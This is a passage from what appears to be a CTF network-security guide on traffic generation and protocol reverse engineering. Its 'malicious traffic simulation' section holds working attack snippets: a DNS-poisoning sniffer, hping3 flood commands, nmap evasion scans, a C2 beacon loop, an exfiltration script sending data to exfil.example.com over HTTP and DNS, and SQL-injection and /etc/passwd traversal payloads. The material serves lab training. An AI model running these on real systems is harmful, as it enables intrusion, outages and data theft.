        if "target.com" in qname:
            # Inject fake response
            spoofed = IP(src=pkt[IP].dst, dst=pkt[IP].src)/\
                     UDP(sport=53, dport=pkt[UDP].sport)/\
                     DNS(id=pkt[DNS].id, qr=1, aa=1, ra=1,
                         qd=pkt[DNS].qd,
                         an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=3600, rdata="192.168.1.66"))
            send(spoofed, verbose=0)
            print(f"Poisoned DNS response for {qname}")

sniff(filter="udp port 53", prn=poison_dns, store=0)
```

---

## Traffic Generation Tasks

Traffic generation challenges require creating synthetic network traffic that mimics specific patterns, protocols, or behaviors. These tasks test the ability to simulate realistic network conditions, generate load for testing, or create traffic that evades detection while meeting specific requirements.

### Synthetic Traffic Generation Tools

**Tcpreplay for PCAP replay:**

```bash
# Basic replay
tcpreplay -i eth0 captured_traffic.pcap

# Replay at specific speed
tcpreplay -i eth0 -M 10 captured_traffic.pcap  # 10 Mbps

# Replay faster than captured
tcpreplay -i eth0 -t captured_traffic.pcap  # As fast as possible

# Replay with multiplier
tcpreplay -i eth0 -x 2 captured_traffic.pcap  # 2x speed

# Loop replay indefinitely
tcpreplay -i eth0 -l 0 captured_traffic.pcap

# Rewrite MAC addresses
tcpreplay -i eth0 --enet-dmac=00:11:22:33:44:55 --enet-smac=66:77:88:99:aa:bb captured_traffic.pcap

# Rewrite IP addresses
tcpreplay -i eth0 --srcipmap=0.0.0.0/0:192.168.1.0/24 --dstipmap=0.0.0.0/0:10.0.0.0/24 captured_traffic.pcap
```

**Tcprewrite for traffic modification:**

```bash
# Change source/destination IPs
tcprewrite --infile=original.pcap --outfile=modified.pcap \
  --srcipmap=192.168.1.0/24:10.0.0.0/24 \
  --dstipmap=192.168.2.0/24:10.1.0.0/24

# Change MAC addresses
tcprewrite --infile=original.pcap --outfile=modified.pcap \
  --enet-dmac=aa:bb:cc:dd:ee:ff --enet-smac=11:22:33:44:55:66

# Randomize IP addresses
tcprewrite --infile=original.pcap --outfile=modified.pcap --seed=12345 --randomize-ip

# Fix checksums
tcprewrite --infile=original.pcap --outfile=modified.pcap --fixcsum

# Change MTU (fragment packets)
tcprewrite --infile=original.pcap --outfile=modified.pcap --mtu=512 --mtu-trunc
```

**D-ITG (Distributed Internet Traffic Generator):**

```bash
# Install D-ITG
apt-get install d-itg

# Generate constant bit rate traffic
ITGSend -a 192.168.1.100 -rp 5000 -C 1000 -c 100 -t 10000
# -a: destination, -rp: receiver port, -C: packets/s, -c: packet size, -t: duration ms

# Variable bit rate with Poisson distribution
ITGSend -a 192.168.1.100 -T TCP -rp 80 -O 50 -o 20 -t 60000
# -O: mean, -o: standard deviation

# Exponential inter-departure time
ITGSend -a 192.168.1.100 -E 100 -e 30 -t 30000

# Multi-flow generation
ITGSend -a 192.168.1.100 -T TCP -rp 80 -C 100 -c 500 &
ITGSend -a 192.168.1.100 -T UDP -rp 53 -C 50 -c 200 &

# Generate specific application traffic (DNS)
ITGSend -a 192.168.1.100 -T UDP -rp 53 -M DNS

# Log generation
ITGRecv -l receiver.log &
ITGSend -a 192.168.1.100 -l sender.log -x receiver.log -rp 8000 -C 100 -t 60000
ITGDec receiver.log
```

### Protocol-Specific Traffic Generation

**HTTP traffic generation with Curl:**

```bash
# Generate HTTP GET requests
for i in {1..1000}; do
  curl -s http://192.168.1.100/page$i.html > /dev/null
  sleep 0.1
done

# POST requests with data
for i in {1..100}; do
  curl -s -X POST -d "data=value$i" http://192.168.1.100/submit
done

# Custom headers
curl -H "X-Custom-Header: flag{http_traffic}" http://192.168.1.100/

# Parallel requests with GNU Parallel
seq 1 1000 | parallel -j 10 "curl -s http://192.168.1.100/page{}.html > /dev/null"

# Generate traffic matching specific pattern
while true; do
  curl -s "http://192.168.1.100/search?q=$(openssl rand -hex 10)" > /dev/null
  sleep $((RANDOM % 5 + 1))
done
```

**Apache Bench for HTTP load:**

```bash
# Basic load test
ab -n 10000 -c 100 http://192.168.1.100/

# With keep-alive
ab -n 10000 -c 100 -k http://192.168.1.100/

# POST requests
ab -n 1000 -c 50 -p postdata.txt -T "application/x-www-form-urlencoded" http://192.168.1.100/submit

# Custom headers
ab -n 5000 -c 100 -H "X-Flag: flag{load_test}" http://192.168.1.100/

# Authentication
ab -n 1000 -c 50 -A username:password http://192.168.1.100/admin/
```

**DNS traffic generation:**

```bash
# Generate DNS queries with dig
for i in {1..1000}; do
  dig @192.168.1.53 subdomain$i.example.com +short
done

# Random subdomains
while true; do
  dig @192.168.1.53 $(openssl rand -hex 8).example.com
  sleep 0.5
done

# Specific record types
for type in A AAAA MX TXT NS; do
  dig @192.168.1.53 example.com $type
done

# DNS tunneling simulation
data="exfiltrated_data"
hex_data=$(echo -n "$data" | xxd -p | tr -d '\n')
dig @192.168.1.53 $hex_data.tunnel.example.com
```

**ICMP traffic generation:**

```bash
# Continuous ping
ping -i 0.2 192.168.1.100  # 5 packets/second

# Variable size packets
for size in 64 128 256 512 1024 1500; do
  ping -c 10 -s $size 192.168.1.100
done

# Flood ping (requires root)
ping -f 192.168.1.100

# Custom payload
ping -p 666c6167 192.168.1.100  # Hex for "flag"
```

### Realistic Traffic Pattern Generation

**Simulate web browsing behavior:**

```python
#!/usr/bin/env python3
import requests
import time
import random

base_url = "http://192.168.1.100"
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

pages = ["/", "/about", "/products", "/contact", "/blog"]

def simulate_user_session():
    session = requests.Session()
    session.headers.update({"User-Agent": random.choice(user_agents)})
    
    # Land on homepage
    session.get(f"{base_url}/")
    time.sleep(random.uniform(2, 5))
    
    # Browse 3-7 pages
    for _ in range(random.randint(3, 7)):
        page = random.choice(pages)
        session.get(f"{base_url}{page}")
        time.sleep(random.uniform(1, 3))
    
    # Download resource
    session.get(f"{base_url}/download/file.pdf")
    time.sleep(random.uniform(0.5, 2))

# Simulate multiple users
for user_id in range(50):
    print(f"User {user_id} session starting")
    simulate_user_session()
    time.sleep(random.uniform(5, 15))
```

**Simulate email traffic:**

```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import random

smtp_server = "192.168.1.25"
sender = "user@internal.com"
recipients = [f"user{i}@internal.com" for i in range(1, 11)]

def send_email(recipient, subject, body):
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    with smtplib.SMTP(smtp_server, 25) as server:
        server.send_message(msg)
        print(f"Email sent to {recipient}")

# Generate email traffic
subjects = ["Meeting reminder", "Project update", "Question", "FYI", "Follow-up"]
for _ in range(100):
    recipient = random.choice(recipients)
    subject = random.choice(subjects)
    body = f"This is test email #{random.randint(1000, 9999)}"
    send_email(recipient, subject, body)
    time.sleep(random.uniform(5, 30))
```

**Simulate file transfer traffic:**

```python
#!/usr/bin/env python3
from ftplib import FTP
import os
import random
import time

ftp_server = "192.168.1.20"
username = "ftpuser"
password = "password"

def generate_file(size_mb):
    filename = f"test_file_{random.randint(1000, 9999)}.dat"
    with open(filename, 'wb') as f:
        f.write(os.urandom(size_mb * 1024 * 1024))
    return filename

def upload_file(filename):
    ftp = FTP(ftp_server)
    ftp.login(username, password)
    with open(filename, 'rb') as f:
        ftp.storbinary(f'STOR {filename}', f)
    ftp.quit()
    print(f"Uploaded {filename}")
    os.remove(filename)

# Generate upload traffic
for _ in range(20):
    size = random.choice([1, 5, 10, 50])
    filename = generate_file(size)
    upload_file(filename)
    time.sleep(random.uniform(10, 60))
```

### Network Performance Testing

**iPerf for throughput generation:**

```bash
# Start iPerf server
iperf3 -s -p 5201

# TCP throughput test
iperf3 -c 192.168.1.100 -p 5201 -t 60  # 60 seconds

# UDP throughput with specific bandwidth
iperf3 -c 192.168.1.100 -u -b 100M -t 30

# Parallel streams
iperf3 -c 192.168.1.100 -P 10  # 10 parallel connections

# Bidirectional test
iperf3 -c 192.168.1.100 --bidir

# JSON output for parsing
iperf3 -c 192.168.1.100 -J > results.json

# Reverse mode (server sends data)
iperf3 -c 192.168.1.100 -R
```

**Netcat for simple traffic generation:**

```bash
# TCP data transfer
# Receiver
nc -l -p 1234 > /dev/null

# Sender
dd if=/dev/zero bs=1M count=100 | nc 192.168.1.100 1234

# UDP traffic
nc -u 192.168.1.100 5000 < /dev/urandom

# Generate HTTP-like traffic
while true; do
  echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc 192.168.1.100 80
  sleep 1
done
```

### Malicious Traffic Simulation

**Port scanning simulation:**

```bash
# Nmap scan patterns
nmap -sS 192.168.1.0/24  # SYN scan
nmap -sT 192.168.1.100 -p 1-65535  # Full connect scan
nmap -sU 192.168.1.100  # UDP scan
nmap -sN 192.168.1.100  # NULL scan
nmap -sF 192.168.1.100  # FIN scan
nmap -sX 192.168.1.100  # XMAS scan

# Slow scan to evade IDS
nmap -sS 192.168.1.100 -T0 --scan-delay 10s

# Decoy scan
nmap -sS 192.168.1.100 -D 10.0.0.1,10.0.0.2,10.0.0.3,ME
```

**DDoS simulation (authorized testing only):**

```bash
# SYN flood with hping3
hping3 -S -p 80 --flood --rand-source 192.168.1.100

# UDP flood
hping3 --udp -p 53 --flood --rand-source 192.168.1.100

# ICMP flood
hping3 -1 --flood 192.168.1.100

# HTTP flood with Slow Loris
slowhttptest -c 1000 -H -g -o slowloris_output -i 10 -r 200 -t GET -u http://192.168.1.100
```

**C2 beaconing simulation:**

```python
#!/usr/bin/env python3
import requests
import time
import random

c2_server = "http://192.168.1.200:8080"
beacon_interval = 60  # seconds
jitter = 0.3  # 30% jitter

while True:
    try:
        # Beacon request
        response = requests.get(f"{c2_server}/beacon", 
                               headers={"X-ID": "bot123"},
                               timeout=5)
        print(f"Beacon sent, response: {response.status_code}")
        
        # Parse command (if any)
        if response.status_code == 200:
            print(f"Command received: {response.text}")
    except Exception as e:
        print(f"Beacon failed: {e}")
    
    # Sleep with jitter
    sleep_time = beacon_interval * (1 + random.uniform(-jitter, jitter))
    time.sleep(sleep_time)
```

**Data exfiltration simulation:**

```python
#!/usr/bin/env python3
import requests
import base64
import time

target_url = "http://exfil.example.com/upload"
sensitive_data = b"flag{exfiltrated_secret_data}" * 100

# Exfiltrate via POST
chunks = [sensitive_data[i:i+100] for i in range(0, len(sensitive_data), 100)]
for chunk in chunks:
    encoded = base64.b64encode(chunk).decode()
    requests.post(target_url, data={"data": encoded})
    time.sleep(2)

# Exfiltrate via DNS
dns_server = "192.168.1.53"
for i in range(0, len(sensitive_data), 32):
    chunk = sensitive_data[i:i+32]
    hex_data = chunk.hex()
    subdomain = f"{hex_data}.exfil.example.com"
    os.system(f"dig @{dns_server} {subdomain} +short")
    time.sleep(1)
```

### Traffic Generation for Specific Challenge Requirements

**Generate traffic matching byte patterns:**

```python
#!/usr/bin/env python3
from scapy.all import *

import time
import random
import os
from scapy.all import IP, TCP, UDP, Raw, send

def generate_pattern_traffic(pattern, count=100):
    """
    Generate packets containing a specific byte pattern.
    
    :param pattern: The byte pattern to include in the payload.
    :param count: The number of packets to send.
    """
    for i in range(count):
        # Create a payload by repeating the pattern
        payload = pattern * ((1000 // len(pattern)) + 1)
        
        # Construct the packet with the payload
        packet = IP(dst="192.168.1.100") / TCP(dport=8080) / Raw(load=payload[:1000])
        
        # Send the packet without verbose output
        send(packet, verbose=0)
        
        # Print progress every 10 packets
        if i % 10 == 0:
            print(f"Sent {i} packets with pattern")
        
        # Sleep for a short duration
        time.sleep(0.1)

# Generate traffic with a specific signature
generate_pattern_traffic(b"\x42\x42\x42\x42")

# Generate traffic with a flag embedded
flag = b"flag{hidden_in_traffic}"
for i in range(100):
    # Generate legitimate data
    legitimate_data = os.urandom(500)
    
    # Construct the packet payload with the flag embedded
    packet_payload = legitimate_data + flag + os.urandom(500)
    
    # Construct the packet with the payload
    packet = IP(dst="192.168.1.100") / UDP(dport=9999) / Raw(load=packet_payload)
    
    # Send the packet without verbose output
    send(packet, verbose=0)

````

**Generate traffic at specific intervals:**

```python
#!/usr/bin/env python3
from scapy.all import *
import time

def timed_traffic_generation(interval_seconds, duration_minutes):
    """Generate packet every N seconds for M minutes"""
    end_time = time.time() + (duration_minutes * 60)
    packet_num = 0
    
    while time.time() < end_time:
        packet = IP(dst="192.168.1.100")/ICMP()/Raw(load=f"Packet {packet_num}".encode())
        send(packet, verbose=0)
        print(f"[{time.strftime('%H:%M:%S')}] Sent packet {packet_num}")
        packet_num += 1
        time.sleep(interval_seconds)

# Send packet every 5 seconds for 10 minutes
timed_traffic_generation(5, 10)
````

**Generate traffic matching protocol distribution:**

```python
#!/usr/bin/env python3
from scapy.all import *
import random

def generate_mixed_traffic(total_packets=1000, distribution=None):
    """
    Generate traffic matching specific protocol distribution
    distribution: dict with protocol percentages
    """
    if distribution is None:
        distribution = {
            'http': 40,
            'dns': 25,
            'smtp': 15,
            'ssh': 10,
            'other': 10
        }
    
    target = "192.168.1.100"
    
    for i in range(total_packets):
        rand = random.random() * 100
        cumulative = 0
        
        for protocol, percentage in distribution.items():
            cumulative += percentage
            if rand <= cumulative:
                if protocol == 'http':
                    packet = IP(dst=target)/TCP(dport=80)/Raw(load=b"GET / HTTP/1.1\r\n\r\n")
                elif protocol == 'dns':
                    packet = IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
                elif protocol == 'smtp':
                    packet = IP(dst=target)/TCP(dport=25)/Raw(load=b"HELO test.com\r\n")
                elif protocol == 'ssh':
                    packet = IP(dst=target)/TCP(dport=22, flags="S")
                else:
                    packet = IP(dst=target)/TCP(dport=random.randint(1024, 65535))
                
                send(packet, verbose=0)
                break
        
        if i % 100 == 0:
            print(f"Generated {i} packets")
        time.sleep(0.01)

# Generate traffic: 40% HTTP, 25% DNS, 15% SMTP, 10% SSH, 10% other
generate_mixed_traffic(1000)
```

**Generate traffic with specific statistical properties:**

```python
#!/usr/bin/env python3
from scapy.all import *
import random
import numpy as np

def generate_statistical_traffic(mean_size=500, std_dev=100, count=1000):
    """Generate packets with sizes following normal distribution"""
    target = "192.168.1.100"
    
    # Generate packet sizes from normal distribution
    sizes = np.random.normal(mean_size, std_dev, count)
    sizes = np.clip(sizes, 64, 1500).astype(int)  # Clamp to valid range
    
    for i, size in enumerate(sizes):
        payload = os.urandom(size - 40)  # Account for headers
        packet = IP(dst=target)/TCP(dport=8080)/Raw(load=payload)
        send(packet, verbose=0)
        
        if i % 100 == 0:
            print(f"Sent {i} packets, mean size: {np.mean(sizes[:i+1]):.2f}")
        time.sleep(0.05)

generate_statistical_traffic(mean_size=800, std_dev=200, count=1000)
```

### Pcap Generation and Manipulation

**Generate PCAP programmatically:**

```python
#!/usr/bin/env python3
from scapy.all import *

def create_custom_pcap(filename, packet_count=1000):
    """Create PCAP file with custom traffic patterns"""
    packets = []
    
    # Generate conversation
    src_ip = "192.168.1.50"
    dst_ip = "192.168.1.100"
    
    # TCP handshake
    syn = IP(src=src_ip, dst=dst_ip)/TCP(sport=12345, dport=80, flags="S", seq=1000)
    packets.append(syn)
    
    syn_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=80, dport=12345, flags="SA", seq=5000, ack=1001)
    packets.append(syn_ack)
    
    ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=12345, dport=80, flags="A", seq=1001, ack=5001)
    packets.append(ack)
    
    # Data exchange
    for i in range(packet_count):
        data = IP(src=src_ip, dst=dst_ip)/TCP(sport=12345, dport=80, flags="PA", seq=1001+i*100, ack=5001)/\
               Raw(load=f"Data packet {i}".encode())
        packets.append(data)
        
        response = IP(src=dst_ip, dst=src_ip)/TCP(sport=80, dport=12345, flags="PA", seq=5001+i*50, ack=1001+(i+1)*100)/\
                   Raw(load=f"Response {i}".encode())
        packets.append(response)
    
    # Close connection
    fin = IP(src=src_ip, dst=dst_ip)/TCP(sport=12345, dport=80, flags="FA", seq=1001+packet_count*100, ack=5001+packet_count*50)
    packets.append(fin)
    
    fin_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=80, dport=12345, flags="FA", seq=5001+packet_count*50, ack=1002+packet_count*100)
    packets.append(fin_ack)
    
    final_ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=12345, dport=80, flags="A", seq=1002+packet_count*100, ack=5002+packet_count*50)
    packets.append(final_ack)
    
    # Write to PCAP
    wrpcap(filename, packets)
    print(f"Created {filename} with {len(packets)} packets")

create_custom_pcap("generated_traffic.pcap", 100)
```

**Merge multiple PCAPs with timing:**

```bash
# Merge PCAPs in chronological order
mergecap -w merged_output.pcap capture1.pcap capture2.pcap capture3.pcap

# Merge with append mode
mergecap -a -w merged_output.pcap *.pcap

# Merge and sort by timestamp
capinfos -aE capture*.pcap | sort | awk '{print $1}' | \
  xargs mergecap -w time_sorted.pcap
```

**Split PCAP by criteria:**

```bash
# Split by packet count
editcap -c 1000 large_capture.pcap split_output.pcap
# Creates split_output_00000_*.pcap files with 1000 packets each

# Split by time interval (seconds)
editcap -i 60 capture.pcap time_split.pcap
# Creates files for each 60-second interval

# Extract specific time range
editcap -A "2025-10-20 10:00:00" -B "2025-10-20 11:00:00" \
  capture.pcap time_range.pcap

# Extract packets by number range
editcap -r capture.pcap filtered.pcap 100-200
# Extract packets 100 through 200
```

### Traffic Normalization and Anonymization

**Anonymize sensitive data:**

```bash
# Anonymize IP addresses
tcprewrite --infile=original.pcap --outfile=anonymized.pcap \
  --seed=12345 --randomize-ip

# Replace specific IPs
tcprewrite --infile=original.pcap --outfile=modified.pcap \
  --srcipmap=192.168.1.0/24:10.0.0.0/24 \
  --dstipmap=192.168.2.0/24:10.1.0.0/24

# Strip payload data
tcprewrite --infile=original.pcap --outfile=headers_only.pcap \
  --mtu=96 --mtu-trunc  # Keep only headers

# Anonymize with TraceWrangler (GUI tool, command-line via scripting)
# Replace MAC addresses, anonymize IPs, strip payloads
```

**Normalize timestamps:**

```bash
# Reset timestamps to start at zero
editcap -t 0 capture.pcap normalized.pcap

# Shift timestamps forward by offset
editcap -t +3600 capture.pcap shifted.pcap  # +1 hour

# Set all packets to specific time
editcap -t -1609459200 capture.pcap fixed_time.pcap
```

### Challenge-Specific Generation Scenarios

**Scenario: Generate traffic that triggers IDS alert:**

```python
#!/usr/bin/env python3
from scapy.all import *

def generate_ids_trigger():
    """Generate traffic patterns that trigger common IDS signatures"""
    target = "192.168.1.100"
    
    # SQL injection attempt
    http_sqli = IP(dst=target)/TCP(dport=80, flags="PA")/\
                Raw(load=b"GET /?id=1' OR '1'='1 HTTP/1.1\r\nHost: test.com\r\n\r\n")
    send(http_sqli)
    
    # Directory traversal
    http_traversal = IP(dst=target)/TCP(dport=80, flags="PA")/\
                     Raw(load=b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: test.com\r\n\r\n")
    send(http_traversal)
    
    # Nmap scan signature
    for port in [21, 22, 23, 25, 80, 443]:
        packet = IP(dst=target)/TCP(dport=port, flags="S")
        send(packet, verbose=0)
        time.sleep(0.1)
    
    # Metasploit user-agent
    http_msf = IP(dst=target)/TCP(dport=80, flags="PA")/\
               Raw(load=b"GET / HTTP/1.1\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n\r\n")
    send(http_msf)
    
    print("IDS trigger traffic generated")

generate_ids_trigger()
```

**Scenario: Generate traffic for bandwidth testing:**

```python
#!/usr/bin/env python3
from scapy.all import *
import time

def bandwidth_test(target, duration_seconds=60, target_mbps=100):
    """Generate traffic at specific bandwidth"""
    packet_size = 1500  # bytes
    bits_per_packet = packet_size * 8
    target_bps = target_mbps * 1_000_000
    packets_per_second = target_bps / bits_per_packet
    interval = 1.0 / packets_per_second
    
    print(f"Generating {target_mbps} Mbps for {duration_seconds} seconds")
    print(f"Sending {packets_per_second:.2f} packets/second")
    
    end_time = time.time() + duration_seconds
    packet_count = 0
    
    payload = os.urandom(packet_size - 40)  # Account for IP+TCP headers
    
    while time.time() < end_time:
        packet = IP(dst=target)/TCP(dport=5001)/Raw(load=payload)
        send(packet, verbose=0)
        packet_count += 1
        time.sleep(interval)
    
    actual_duration = duration_seconds
    actual_mbps = (packet_count * packet_size * 8) / (actual_duration * 1_000_000)
    print(f"Sent {packet_count} packets")
    print(f"Actual bandwidth: {actual_mbps:.2f} Mbps")

bandwidth_test("192.168.1.100", duration_seconds=30, target_mbps=50)
```

**Scenario: Generate traffic for protocol fuzzing:**

```python
#!/usr/bin/env python3
from scapy.all import *
import random

def fuzz_protocol(target, port, protocol="tcp", iterations=1000):
    """Generate malformed packets for fuzzing"""
    print(f"Fuzzing {target}:{port} with {iterations} iterations")
    
    for i in range(iterations):
        if protocol == "tcp":
            # Random TCP flags
            flags = random.choice(["S", "SA", "R", "F", "P", "U", "SF", "SR", "FSRPAU", ""])
            
            # Random options
            options = []
            if random.random() > 0.5:
                options.append(('MSS', random.randint(0, 65535)))
            if random.random() > 0.5:
                options.append((random.randint(0, 255), os.urandom(random.randint(0, 40))))
            
            packet = IP(dst=target)/TCP(dport=port, flags=flags, options=options)/Raw(load=os.urandom(random.randint(0, 1000)))
        
        elif protocol == "udp":
            packet = IP(dst=target)/UDP(dport=port)/Raw(load=os.urandom(random.randint(0, 1500)))
        
        elif protocol == "icmp":
            icmp_type = random.randint(0, 255)
            icmp_code = random.randint(0, 255)
            packet = IP(dst=target)/ICMP(type=icmp_type, code=icmp_code)/Raw(load=os.urandom(random.randint(0, 1000)))
        
        send(packet, verbose=0)
        
        if i % 100 == 0:
            print(f"Sent {i} fuzzed packets")
        
        time.sleep(0.01)

fuzz_protocol("192.168.1.100", 80, "tcp", 500)
```

**Scenario: Generate covert channel traffic:**

```python
#!/usr/bin/env python3
from scapy.all import *

def covert_channel_timing(target, data):
    """Encode data in packet timing (inter-arrival times)"""
    binary_data = ''.join(format(ord(c), '08b') for c in data)
    
    print(f"Encoding '{data}' in timing covert channel")
    print(f"Binary: {binary_data}")
    
    for bit in binary_data:
        packet = IP(dst=target)/ICMP()
        send(packet, verbose=0)
        
        # '1' = 0.1s interval, '0' = 0.05s interval
        if bit == '1':
            time.sleep(0.1)
        else:
            time.sleep(0.05)
    
    print("Covert channel transmission complete")

covert_channel_timing("192.168.1.100", "FLAG")
```

### Performance Monitoring During Generation

```python
#!/usr/bin/env python3
import psutil
import time
from scapy.all import *

def monitored_traffic_generation(target, duration=60):
    """Generate traffic while monitoring system performance"""
    start_time = time.time()
    packet_count = 0
    
    print("Starting monitored traffic generation")
    print(f"{'Time':<10} {'Packets':<10} {'CPU%':<10} {'Mem%':<10} {'NetSent':<15}")
    print("-" * 55)
    
    net_start = psutil.net_io_counters()
    
    while time.time() - start_time < duration:
        # Generate packet
        packet = IP(dst=target)/TCP(dport=80)/Raw(load=os.urandom(1000))
        send(packet, verbose=0)
        packet_count += 1
        
        # Monitor every second
        if packet_count % 100 == 0:
            elapsed = time.time() - start_time
            cpu_percent = psutil.cpu_percent()
            mem_percent = psutil.virtual_memory().percent
            net_current = psutil.net_io_counters()
            net_sent = net_current.bytes_sent - net_start.bytes_sent
            
            print(f"{elapsed:<10.1f} {packet_count:<10} {cpu_percent:<10.1f} {mem_percent:<10.1f} {net_sent:<15}")
        
        time.sleep(0.01)
    
    print(f"\nGeneration complete: {packet_count} packets in {duration} seconds")
    print(f"Rate: {packet_count/duration:.2f} packets/second")

monitored_traffic_generation("192.168.1.100", 60)
```

---

These four challenge types form the core of CTF network traffic analysis competitions. Mastering PCAP analysis enables flag discovery in captured traffic, network forensics develops incident investigation skills, packet injection tests protocol manipulation abilities, and traffic generation validates the capability to create realistic or targeted network behaviors. Together, they represent comprehensive network security expertise applicable to real-world scenarios beyond competitive CTF environments.

---

## Protocol Implementation

### Custom Protocol Reverse Engineering

**Identifying Unknown Protocols**

When encountering custom network protocols in CTF challenges:

1. **Initial Protocol Fingerprinting**

```bash
# Capture traffic for analysis
tcpdump -i eth0 -w custom_protocol.pcap 'port 9999'

# Basic packet inspection
tcpdump -r custom_protocol.pcap -X | less

# Extract first 100 bytes of each packet
tshark -r custom_protocol.pcap -T fields -e data | head -20

# Analyze packet size distribution
tshark -r custom_protocol.pcap -T fields -e frame.len | \
    sort -n | uniq -c | sort -rn
```

2. **Entropy Analysis for Protocol Structure**

```python
#!/usr/bin/env python3
# protocol_entropy.py - Detect encrypted/compressed sections

from scapy.all import *
import numpy as np
from collections import Counter
import matplotlib.pyplot as plt

def calculate_entropy(data):
    """Calculate Shannon entropy of byte sequence"""
    if not data:
        return 0
    
    counter = Counter(data)
    length = len(data)
    entropy = -sum((count/length) * np.log2(count/length) 
                   for count in counter.values())
    return entropy

def analyze_protocol(pcap_file):
    """Analyze entropy across protocol fields"""
    packets = rdpcap(pcap_file)
    
    results = []
    for i, pkt in enumerate(packets):
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            
            # Analyze in chunks
            chunk_size = 16
            for offset in range(0, len(payload), chunk_size):
                chunk = payload[offset:offset+chunk_size]
                if len(chunk) == chunk_size:
                    entropy = calculate_entropy(chunk)
                    results.append({
                        'packet': i,
                        'offset': offset,
                        'entropy': entropy,
                        'data': chunk.hex()
                    })
    
    # Plot entropy distribution
    entropies = [r['entropy'] for r in results]
    plt.hist(entropies, bins=50)
    plt.xlabel('Entropy')
    plt.ylabel('Frequency')
    plt.title('Protocol Entropy Distribution')
    plt.savefig('entropy_distribution.png')
    
    # Identify low-entropy regions (potential headers/constants)
    low_entropy = [r for r in results if r['entropy'] < 3.0]
    print(f"Found {len(low_entropy)} low-entropy chunks (potential structure)")
    
    # Identify high-entropy regions (encrypted/compressed data)
    high_entropy = [r for r in results if r['entropy'] > 7.0]
    print(f"Found {len(high_entropy)} high-entropy chunks (potential encryption)")
    
    return results

if __name__ == '__main__':
    import sys
    results = analyze_protocol(sys.argv[1])
    
    # Print sample low-entropy chunks
    print("\nSample structured data (low entropy):")
    for r in results[:5]:
        if r['entropy'] < 3.0:
            print(f"Packet {r['packet']}, Offset {r['offset']}: {r['data']}")
```

**Protocol Field Extraction Techniques**

Finding delimiters and field boundaries:

```python
#!/usr/bin/env python3
# field_extractor.py - Identify protocol field boundaries

from scapy.all import *
from collections import defaultdict

def find_repeating_patterns(pcap_file, min_length=4):
    """Identify repeating byte sequences (potential delimiters)"""
    packets = rdpcap(pcap_file)
    
    pattern_positions = defaultdict(list)
    
    for pkt_idx, pkt in enumerate(packets):
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            
            # Search for patterns of various lengths
            for length in range(min_length, min(20, len(payload))):
                for offset in range(len(payload) - length + 1):
                    pattern = payload[offset:offset+length]
                    pattern_positions[pattern].append((pkt_idx, offset))
    
    # Find patterns that appear in multiple packets at consistent offsets
    delimiters = {}
    for pattern, positions in pattern_positions.items():
        if len(positions) >= 3:  # Appears in at least 3 packets
            # Check if offset is consistent
            offsets = [pos[1] for pos in positions]
            if len(set(offsets)) == 1:  # Same offset in all packets
                delimiters[pattern.hex()] = {
                    'occurrences': len(positions),
                    'offset': offsets[0],
                    'ascii': ''.join(chr(b) if 32 <= b < 127 else '.' for b in pattern)
                }
    
    return delimiters

def analyze_field_lengths(pcap_file):
    """Detect fixed-length and variable-length fields"""
    packets = rdpcap(pcap_file)
    
    payload_lengths = []
    payloads = []
    
    for pkt in packets:
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            payload_lengths.append(len(payload))
            payloads.append(payload)
    
    print(f"Payload length statistics:")
    print(f"  Min: {min(payload_lengths)}")
    print(f"  Max: {max(payload_lengths)}")
    print(f"  Mean: {sum(payload_lengths)/len(payload_lengths):.2f}")
    print(f"  Unique lengths: {len(set(payload_lengths))}")
    
    # Check for fixed-length header
    if len(set(payload_lengths)) > 1:
        min_len = min(payload_lengths)
        print(f"\nAnalyzing first {min_len} bytes as potential header...")
        
        # Compare headers across packets
        headers = [p[:min_len] for p in payloads]
        
        # Find byte positions with constant values
        constant_positions = []
        for pos in range(min_len):
            bytes_at_pos = [h[pos] for h in headers]
            if len(set(bytes_at_pos)) == 1:
                constant_positions.append((pos, bytes_at_pos[0]))
        
        print(f"Found {len(constant_positions)} constant byte positions:")
        for pos, value in constant_positions[:10]:
            print(f"  Position {pos}: 0x{value:02x} ('{chr(value) if 32 <= value < 127 else '.'}')")

if __name__ == '__main__':
    import sys
    
    print("=== Protocol Field Analysis ===\n")
    
    print("Searching for delimiters...")
    delimiters = find_repeating_patterns(sys.argv[1])
    
    print(f"\nFound {len(delimiters)} potential delimiters:")
    for pattern_hex, info in sorted(delimiters.items(), 
                                    key=lambda x: x[1]['occurrences'], 
                                    reverse=True)[:10]:
        print(f"  {pattern_hex} ('{info['ascii']}'): "
              f"{info['occurrences']} occurrences at offset {info['offset']}")
    
    print("\n" + "="*60 + "\n")
    analyze_field_lengths(sys.argv[1])
```

### Protocol State Machine Reconstruction

**Identifying Protocol Handshakes**

```python
#!/usr/bin/env python3
# state_machine_analyzer.py - Reconstruct protocol state machine

from scapy.all import *
from collections import defaultdict
import networkx as nx
import matplotlib.pyplot as plt

class ProtocolStateMachine:
    def __init__(self):
        self.transitions = defaultdict(lambda: defaultdict(int))
        self.states = set()
    
    def extract_message_type(self, payload):
        """
        Extract message type identifier from payload
        [Inference: Assumes first byte or first few bytes indicate message type]
        """
        if len(payload) < 4:
            return None
        
        # Try multiple heuristics
        candidates = [
            payload[0],  # First byte
            payload[:2],  # First two bytes
            payload[:4],  # First four bytes (potential magic number)
        ]
        
        # Return first non-zero candidate
        for candidate in candidates:
            if isinstance(candidate, int) and candidate != 0:
                return candidate
